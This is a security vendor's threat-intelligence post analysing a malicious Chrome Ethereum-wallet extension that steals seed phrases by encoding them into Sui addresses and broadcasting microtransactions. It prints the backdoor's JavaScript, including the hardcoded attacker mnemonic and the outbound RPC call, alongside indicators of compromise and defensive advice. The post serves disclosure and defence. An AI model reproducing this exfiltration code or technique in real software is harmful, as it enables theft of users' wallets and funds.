---
title: "Malicious Chrome Extension Exfiltrates Seed Phrases, Enabling Wallet Takeover"
short_title: "Malicious Chrome Extension Exfiltrates Seed Phrases"
date: 2026-03-02 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [Chrome, Credential Theft, Extensions, Threat Intelligence, Blockchain, T1195.002, T1176.001, T1204, T1059.007, T1552.004, T1567, T1657]
description: "A malicious Chrome extension posing as an Ethereum wallet steals seed phrases by encoding them into Sui transactions, enabling full wallet takeover."
toc: true
canonical_url: https://socket.dev/blog/malicious-chrome-extension-exfiltrates-seed-phrases
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/4926c75ec99ae90a3b762843ab94b52ebb6093a2-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: Malicious Chrome extension exfiltrates seed phrases artwork
---

Socket's Threat Research Team uncovered the malicious Chrome extension [`Safery: Ethereum Wallet`](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo), published on November 12, 2024. Marketed as a simple, secure Ethereum (ETH) wallet, it contains a backdoor that exfiltrates seed phrases by encoding them into [Sui](https://sui.io/) addresses and broadcasting microtransactions from a threat actor-controlled Sui wallet.

When a user creates or imports a wallet, `Safery: Ethereum Wallet` encodes the `BIP-39` mnemonic into synthetic Sui style addresses, then sends `0.000001` SUI to those recipients using a hardcoded threat actor's mnemonic. By decoding the recipients, the threat actor reconstructs the original seed phrase and can drain affected assets. The mnemonic leaves the browser concealed inside normal looking blockchain transactions.

The extension is [live](https://chromewebstore.google.com/detail/safery-ethereum-wallet/fibemlnkopkeenmmgcfohhcdbkhgbolo) on the Chrome Web Store at the time of writing. We submitted a takedown request to Google's Chrome Web Store security team and asked to suspend the associated publisher account registered with `kifagusertyna@gmail[.]com` email address.

![](https://cdn.sanity.io/images/cgdhsj6q/production/4b1b1f049df9fca8b25bae14bf35a3d3deaa8c3d-624x674.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious [`Safery: Ethereum Wallet`](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo) (`fibemlnkopkeenmmgcfohhcdbkhgbolo`) extension highlights its behavior of decoding a hardcoded Base64 wallet seed, silently sending `0.000001` SUI via `https://sui-rpc.publicnode.com` to addresses derived from the victim mnemonic, and globally exposing `window.logInWallet({ address, privateKeyHex, mnemonic })`, enabling seed theft and on chain exfiltration._

## A Wallet That Looks Safe

The Chrome Web Store [listing](https://chromewebstore.google.com/detail/safery-ethereum-wallet/fibemlnkopkeenmmgcfohhcdbkhgbolo) markets `Safery: Ethereum Wallet` as a standard, user-friendly wallet. Promotional images promise "Easy, Fast And Secure Extension" and "Send Ethereum ETH Coin In 2 Clicks Easy And Safe". The description emphasizes reliability, privacy, and simple balance and transaction views, and the privacy disclosure claims the developer collects no user data and keeps private keys on the device.

![](https://cdn.sanity.io/images/cgdhsj6q/production/a670ced168467068143b1b4248cc8d7a641744d0-1112x717.png?w=1600&q=95&fit=max&auto=format)
_The Chrome Web Store [page](https://chromewebstore.google.com/detail/safery-ethereum-wallet/fibemlnkopkeenmmgcfohhcdbkhgbolo) for `Safery: Ethereum Wallet` markets the extension as a simple, secure ETH wallet that offers quick two click transfers and easy balance management._

At first glance, the extension operates as a standard Ethereum wallet. It creates accounts, imports wallets from a seed phrase, queries balances through a public Ethereum RPC endpoint, shows recent activity via Etherscan or Ethplorer, and sends ETH with a conventional transfer form. For many users, that behavior and the reassuring marketing would be enough to entrust it with their seed phrase.

When searching "Ethereum Wallet" in the Chrome Web Store, the malicious `Safery: Ethereum Wallet` extension appears as the fourth result, positioned alongside legitimate wallets like `MetaMask` and `Enkrypt`. This placement gives it immediate visibility and a veneer of legitimacy to unsuspecting users, increasing the risk of installation before any security review or takedown occurs.

![](https://cdn.sanity.io/images/cgdhsj6q/production/6bc53c1e2aed80b3a4497d45983ab23c4ceaf61a-1593x931.png?w=1600&q=95&fit=max&auto=format)
_Search results for "Ethereum Wallet" on the Chrome Web Store place `Safery: Ethereum Wallet` high in the list, appearing legitimate among trusted MetaMask and Enkrypt wallets._

## A Covert Sui Exfiltration Channel

The backdoor encodes a `BIP-39` mnemonic into one or two Sui style hex addresses. The extension loads the standard wordlist, maps each word to its numeric index, packs the indices into a hexadecimal string, pads it to a 64-character body, and prefixes `0x` so it resembles a valid Sui address.

Twelve word phrases produce one synthetic address, and twenty four word phrases produce two. A paired decoder reverses the process, removing padding, extracting the embedded numbers, and mapping them back to the original word indices to reconstruct the exact mnemonic.

These encoder and decoder functions do not power any user facing feature. The extension never displays Sui balances or prompts for Sui actions. Their sole purpose is to transform the seed phrase into data that can be written on chain without drawing attention.

Login and registration tie the pieces together. They encode the user's mnemonic, then call [`sendSui`](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo/files/1.6/assets/js/login.js#L4) to broadcast microtransactions from a [hardcoded](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo/files/1.6/assets/js/login.js#L129) threat actor wallet to those synthetic addresses. The [snippet](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo/files/1.6/assets/js/login.js) below shows the core logic with inline comments.

```javascript
// After the user enters a valid seed phrase in the login form
const { address, privateKeyHex } = await generateEthFromMnemonic(inputText);

try {
  const list = await loadWordlist();

  // Encode the victim's mnemonic as one or two synthetic Sui-style addresses
  const addrs = phraseToSuiAddressLike(inputText.split(" "), list);

  for (const addr of addrs) {
    if (typeof sendSui === "function") {
      // Send a tiny SUI payment from a hardcoded threat actor mnemonic
      const out = await sendSui({
        mnemonic: fromBase64("c2Vuc2UgY29sbGVjdCBwdWxwIGZsb2F0IG5ldXRyYWwgYnJ1c2ggaG9zcGl0YWwgcHlyYW1pZCBjb2luIHNoaWVsZCB1c2UgYXRvbQ=="),
// Decodes to:
// "sense collect pulp float neutral brush hospital pyramid coin shield use atom"
        to: addr,                      // Recipient encodes the victim's mnemonic
        amountSui: "0.000001",
        rpcUrl: "https://sui-rpc.publicnode.com",
        gasBudgetMist: "1000000"
      });
      console.log("Sent to", addr, out);
    }
  }

  // Log in only after the hidden Sui transactions complete
  window.logInWallet({ name: "", address, privateKey: privateKeyHex, mnemonic: inputText });
} catch (err) {
  console.error(err);
}
```

The `fromBase64` decodes a hardcoded [Base64 string](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo/files/1.6/assets/js/login.js#L129) into a twelve word mnemonic (`sense collect pulp float neutral brush hospital pyramid coin shield use atom`) for a threat actor-controlled Sui wallet. On each wallet creation or import, `Safery: Ethereum Wallet` uses that mnemonic to sign one or more Sui transactions to synthetic addresses derived from the victim mnemonic. Each transaction sends a tiny amount of SUI to satisfy network rules.

To outside observers, these look like microtransactions to arbitrary recipients. For the threat actor, each recipient address encodes the victim mnemonic. Using the same decoder embedded in the extension, the threat actor reconstructs the seed phrase word by word. The seed never travels in plaintext over HTTP, and no central command and control (C2) server is required. Exfiltration occurs entirely within normal looking blockchain traffic.

With a recovered mnemonic, the threat actor gains full control of derived wallets. They can import the seed into any client, derive the same Ethereum private keys, and transfer assets to their own addresses.

## Outlook and Recommendations

The malicious `Safery: Ethereum Wallet` extension shows that seed theft can be concealed by using public blockchains as the exfiltration channel. Any mnemonic entered into a malicious wallet can be leaked without HTTP traffic or a central C2. This technique lets threat actors switch chains and RPC endpoints with little effort, so detections that rely on domains, URLs, or specific extension IDs will miss it.

Defenders should expect reuse across Sui, Solana, and EVM chains and across other wallet UIs. Treat unexpected blockchain RPC calls from the browser as high signal, especially when the product claims to be single chain. Use only trusted wallet extensions with established security track records, for example `MetaMask` or `Phantom`, and install them from verified publisher pages rather than search results or ads. Baseline approved chains and RPC hosts, and alert on deviations. Unpack and scan extensions for mnemonic encoders, synthetic address generators, hardcoded seeds, and signing code unrelated to stated features. Block any extension that writes on chain during wallet import or creation.

Socket can turn these findings into actionable detections with security policy controls. Use Socket's [Chrome extension protection](https://socket.dev/blog/socket-now-protects-the-chrome-extension-ecosystem) to inventory every extension in use, surface permissions and host access, and block risky updates before they land on endpoints. The same analysis engine that flags supply chain risk in open source packages now scans hundreds of thousands of extensions and alerts on behaviors such as excessive permissions, unexpected page access, and data exfiltration.

Fold Socket into existing guardrails. Enforce allowlists in Chrome Enterprise, restrict installs to approved extension IDs, and track permission creep over time. Pair Socket's visibility with network policy for egress control, then watch for lookalike domains as operators rotate infrastructure.

![](https://cdn.sanity.io/images/cgdhsj6q/production/6f5e7bd9eaf4ad64570e10c006e3a5bcc9c42249-1438x861.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious [`Safery: Ethereum Wallet`](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo) extension flags known malware status and risky behaviors, including elevated Chrome permission requests, dynamic code execution via `eval`, outbound network access, and shell access._

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1176.001 — Software Extensions: Browser Extensions
- T1204 — User Execution
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1552.004 — Unsecured Credentials: Private Keys
- T1567 — Exfiltration Over Web Service
- T1657 — Financial Theft

## Indicators of Compromise (IOCs)

### Threat Actor's Email Address

- `kifagusertyna@gmail[.]com`

### Chrome Extension

- Name: [`Safery: Ethereum Wallet`](https://socket.dev/chrome/package/fibemlnkopkeenmmgcfohhcdbkhgbolo)
- Extension Identifier: `fibemlnkopkeenmmgcfohhcdbkhgbolo`

### Hardcoded Threat Actor's Mnemonic

- Base64 encoded value: `c2Vuc2UgY29sbGVjdCBwdWxwIGZsb2F0IG5ldXRyYWwgYnJ1c2ggaG9zcGl0YWwgcHlyYW1pZCBjb2luIHNoaWVsZCB1c2UgYXRvbQ==`
- Decoded phrase: `sense collect pulp float neutral brush hospital pyramid coin shield use atom`
